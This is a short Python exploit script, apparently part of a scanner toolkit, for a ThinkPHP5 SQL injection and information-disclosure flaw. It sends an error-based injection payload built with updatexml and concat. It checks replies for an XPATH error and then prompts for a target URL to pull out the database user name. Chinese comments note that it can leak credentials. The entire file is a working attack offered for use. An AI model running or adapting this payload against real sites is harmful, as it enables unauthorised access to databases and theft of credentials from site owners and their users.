import requests
import re
import urllib

def verify(url):
    relsult = {
        'name': 'ThinkPHP5 SQL Injection Vulnerability && Sensitive Information Disclosure Vulnerability',
        'vulnerable': False
    }
    try:
        payload = urllib.parse.urljoin(url, '/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1')
        response = requests.get(payload, timeout=3, verify=False)
        if re.search(r'XPATH syntax error', response.text):
            relsult['vulnerable'] = True
            relsult['method'] = 'GET'
            relsult['url'] = url
            relsult['payload'] = payload
        return relsult
    except:
        return relsult

# 只能爆出用户名密码(不能子查询)
def exp():
    url = input('输入目标URL:')
    if verify(url):
        print('[+] 存在 ThinkPHP5 SQL Injection Vulnerability && Sensitive Information Disclosure Vulnerability')
        payload = url + r'/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1'
        response = requests.get(payload, timeout=3, verify=False)
        user = re.findall(r"XPATH syntax error: '<br />\n([^']*)'", response.text)[0]
        print('[+] 数据库用户:', user)

